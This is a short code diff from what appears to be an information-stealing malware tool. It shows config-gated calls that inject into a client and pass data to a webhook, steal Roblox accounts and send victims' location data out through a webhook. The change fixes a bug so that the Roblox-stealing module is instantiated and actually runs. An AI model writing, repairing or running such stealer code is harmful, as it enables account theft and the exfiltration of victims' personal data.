@@ -899,7 +899,7 @@ if cc.get_injection() is True:
     injection.InjectionX(webhook)
     
 if cc.get_roblox_stealing() is True:
-    RobloxX.run()
+    RobloxX().run()
 
 if cc.get_location_stealing() is True:
     _webh.locations_webhook(ii.global_info())
